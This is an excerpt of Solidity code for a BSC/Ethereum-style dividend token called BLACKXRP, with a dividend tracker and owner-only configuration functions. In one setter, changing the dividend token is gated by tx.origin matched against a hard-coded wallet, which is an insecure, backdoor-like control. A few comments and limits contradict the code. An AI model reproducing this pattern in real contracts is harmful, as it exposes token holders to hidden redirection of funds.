...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0x396CC89279646dB8224B6685104AC1f55CAF76f4, "Only owner can change dividend contract address");
...
contract BlackXRP is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("BLACKXRP", "BLACKXRP") {
    	ethDividendTracker = new EthDividendTracker();

    	marketingWallet = 0xC2160B0104F30F3e5e98769c007188df6c3c91F2;
    	ethDividendToken = 0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE;
    ...
    receive() external payable {
  	...
  	function updateMarketingWallet(address _newWallet) external onlyOwner {
  	    require(_newWallet != marketingWallet, "BLACKXRP: The marketing wallet is already this address");
    ...
    function afterPreSale() external onlyOwner {
        ...
        maxSellTransactionAmount = 300000000000 * (10**18);
    ...
    function updateEthDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(ethDividendTracker), "BLACKXRP: The dividend tracker already has that address");

        EthDividendTracker newEthDividendTracker = EthDividendTracker(payable(newAddress));

        require(newEthDividendTracker.owner() == address(this), "BLACKXRP: The new dividend tracker must be owned by the BLACKXRP token contract");
    ...
    function updateEthDividendRewardFee(uint8 newFee) external onlyOwner {
        require(newFee <= 19, "BLACKXRP: Fee must be less than 19%");
    ...
    function updateUniswapV2Router(address newAddress) external onlyOwner {
        require(newAddress != address(uniswapV2Router), "BLACKXRP: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(isExcludedFromFees[account] != excluded, "BLACKXRP: Account is already exluded from fees");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "BLACKXRP: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
        require(automatedMarketMakerPairs[pair] != value, "BLACKXRP: Automated market maker pair is already set to that value");
    ...
    function updateGasForProcessing(uint256 newValue) external onlyOwner {
        require(newValue != gasForProcessing, "BLACKXRP: Cannot update gasForProcessing to same value");
    ...
    function _transfer(
        ...
        require(tradingIsEnabled || (isExcludedFromFees[from] || isExcludedFromFees[to]), "BLACKXRP: Trading has not started yet");
...
contract EthDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("BLACKXRP_Ethereum_Dividend_Tracker", "BLACKXRP_Ethereum_Dividend_Tracker", 0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE) {
    	claimWait = 300;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "BLACKXRP_Ethereum_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "BLACKXRP_Ethereum_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main BLACKXRP contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 600 && newClaimWait <= 86400, "BLACKXRP_Ethereum_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "BLACKXRP_Ethereum_Dividend_Tracker: Cannot update claimWait to same value");
